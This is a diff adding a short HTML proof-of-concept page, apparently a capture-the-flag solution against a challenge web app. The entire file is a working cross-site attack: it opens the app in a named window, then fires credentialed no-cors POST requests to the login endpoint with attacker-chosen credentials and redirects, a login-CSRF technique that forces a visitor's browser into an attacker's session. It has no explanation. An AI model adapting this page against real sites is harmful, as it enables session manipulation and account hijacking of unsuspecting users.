@@ -1,0 +1,34 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>poc</title>
+<script>
+const APP = 'http://chal.polyuctf.com:46605';
+const USER = 'cat4';
+const PASS = 'cat1234567';
+
+window.open(APP + '/api/profile', 'victim');
+
+setTimeout(() => {
+  fetch(APP + '/api/auth/login', {
+    method: 'POST',
+    mode: 'no-cors',
+    credentials: 'include',
+    headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+    body: JSON.stringify({ username: USER, password: PASS })
+  });
+}, 800);
+
+setTimeout(() => {
+  fetch(APP + '/api/auth/login', {
+    method: 'POST',
+    mode: 'no-cors',
+    credentials: 'include',
+    headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+    body: JSON.stringify({ username: USER, password: PASS })
+  });
+}, 1400);
+
+setTimeout(() => {
+  location = APP + '/';
+}, 2600);
+</script>
